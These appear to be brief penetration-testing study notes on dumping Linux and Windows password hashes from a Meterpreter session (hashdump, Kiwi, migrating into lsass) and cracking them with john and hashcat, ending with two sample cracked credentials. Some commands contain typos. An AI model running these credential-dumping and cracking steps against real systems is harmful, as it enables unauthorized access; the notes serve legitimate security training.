## Linux

![](</Images/Pasted image 20240120132018.png>)

Can either use john with passwd/shadow file or meterpreter command

After getting admin meterpreter:
`post/linx/gather/hashdump`
That creates the unshadowed file like`unshadow`

Then use john `john --format==sha512crypt <hash file> --wordlist=<wordlist>`

or hashcat `hashcat -a3 -m <hash type 1800> <hash file> <wordlist>`

## Windows Hashes

![](</Images/Pasted image 20240120133053.png>)

![](</Images/Pasted image 20240120133125.png>)

![](</Images/Pasted image 20240120133504.png>)

- Need elevated meterpreter privileges to start
- Migrate to lsass via pgrep. Upgrades to x64 and stabilize meterpreter

Can use Kiwi or hashdump to get hashes and then save into file

via john
- john --list=format to see format options
- john --format=NT {hashfile} --wordlist={wordlist but not necessay}

via hashcat
- hashcat  -a3 (brute force) -m 1000  {hash file} {wordlist}


password1        (bob)
password         (Administrator)